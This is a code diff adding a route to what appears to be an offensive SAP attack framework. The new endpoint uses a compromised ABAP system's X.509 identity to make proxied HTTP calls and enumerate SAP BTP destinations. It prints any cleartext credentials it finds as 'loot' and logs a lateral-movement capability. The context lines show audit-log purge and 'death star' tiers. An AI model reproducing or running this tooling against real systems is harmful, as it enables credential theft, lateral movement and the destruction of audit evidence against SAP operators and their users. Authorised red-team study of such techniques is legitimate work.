@@ -8105,6 +8105,121 @@ def create_app(api: SAPMAPApi) -> Bottle:
              f"Tier 3: DBTABLOG purge ({hold_seconds}s)", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/cert_dest_probe", method="POST")
+    def node_cert_dest_probe(sid):
+        """Kernel-proxied HTTP call over an X.509-cert-authenticated
+        SM59 destination.  Uses ``S_RFC + S_DEVELOP`` on the source
+        ABAP to run a small ABAP report that invokes
+        ``cl_http_client=>create_by_destination`` — the kernel does
+        mutual TLS with the destination's STRUST PSE and returns the
+        response body over RFC.  We never touch the private key.
+
+        When the destination points at ``*.hana.ondemand.com`` (BTP
+        destination service) we additionally parse the response as
+        JSON and flag any destinations carrying cleartext passwords
+        as CRITICAL loot — those are on-prem service credentials the
+        cloud side has been keeping in the clear."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        dest_name = data.get("destination_name", "").strip()
+        if not dest_name:
+            return json.dumps({"error": "destination_name required"})
+
+        # Look up the connection on this node so we can gate on
+        # http_auth_type=X509.  Refusing on non-X509 destinations
+        # is the honest thing to do — the primitive works technically
+        # for basic-auth destinations too, but the operator would be
+        # much better served by test_rfc_single there.
+        conn = None
+        for c in api.state.get_connections_from(sid):
+            if c.destination_name == dest_name:
+                conn = c
+                break
+        if conn is None:
+            return json.dumps({
+                "error": f"destination {dest_name!r} not found on {sid}"})
+        if conn.http_auth_type != "X509":
+            return json.dumps({
+                "error": (f"destination {dest_name!r} is not cert-auth "
+                          f"(http_auth_type={conn.http_auth_type!r}); "
+                          f"use Test RFC Destination for basic-auth")})
+
+        def _run():
+            from sap_http_via_dest import (
+                call_via_destination,
+                enumerate_btp_subaccount_destinations,
+                HttpViaDestError)
+            creds = node.best_credentials()
+            is_btp = ("hana.ondemand.com" in (conn.http_url or ""))
+            print(f"[*] {sid}: cert-dest probe via {dest_name} "
+                  f"(PSE {conn.http_cert_pse or '?'}, "
+                  f"target {conn.http_url or '?'})")
+            try:
+                if is_btp:
+                    r = enumerate_btp_subaccount_destinations(
+                        node, dest_name, creds=creds)
+                    if not r["ok"]:
+                        print(f"[-] {sid}: {dest_name}: "
+                              f"BTP enum failed — {r.get('error', '?')}")
+                        return
+                    print(f"[+] {sid}: {dest_name}: BTP subaccount "
+                          f"returned {r['count']} destination(s), "
+                          f"{len(r['cleartext'])} carry cleartext "
+                          f"secrets")
+                    for hit in r["cleartext"]:
+                        print(f"[!] {sid}: cleartext "
+                              f"{hit['field']} in BTP dest "
+                              f"{hit['name']!r} → "
+                              f"{hit['target_url']} (user: "
+                              f"{hit['user']!r})")
+                    if r["cleartext"]:
+                        emit_finding(
+                            "CRITICAL", sid,
+                            f"Kernel-proxied cert-auth via "
+                            f"{dest_name} extracted "
+                            f"{len(r['cleartext'])} cleartext "
+                            f"on-prem credential(s) from the BTP "
+                            f"subaccount destination service — "
+                            f"lateral move back to on-prem targets.",
+                            attack_capability="lateral.btp_cert_proxy",
+                        )
+                    else:
+                        emit_finding(
+                            "HIGH", sid,
+                            f"Kernel-proxied cert-auth via "
+                            f"{dest_name} reached BTP subaccount "
+                            f"destination service ({r['count']} "
+                            f"destinations returned) — the source "
+                            f"ABAP's X.509 identity works for BTP "
+                            f"management APIs.")
+                else:
+                    r = call_via_destination(
+                        node, dest_name, method="GET", path="/",
+                        creds=creds)
+                    if r["ok"]:
+                        print(f"[+] {sid}: {dest_name}: HTTP "
+                              f"{r['status']} {r.get('reason', '')} "
+                              f"({len(r['body'])} B body)")
+                        emit_finding(
+                            "HIGH", sid,
+                            f"Kernel-proxied cert-auth via "
+                            f"{dest_name} → {conn.http_url}: "
+                            f"HTTP {r['status']}.  Source ABAP's "
+                            f"X.509 identity (PSE "
+                            f"{conn.http_cert_pse or '?'}) works.")
+                    else:
+                        print(f"[-] {sid}: {dest_name}: "
+                              f"{r.get('error', '?')}")
+            except HttpViaDestError as e:
+                print(f"[-] {sid}: cert-dest probe rejected: {e}")
+
+        _bg(f"{sid}:cert_dest_probe:{dest_name}",
+             f"Cert-auth probe via {dest_name}", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/tier3_sal_death_star_launch",
                 method="POST")
     def node_tier3_sal_death_star_launch(sid):
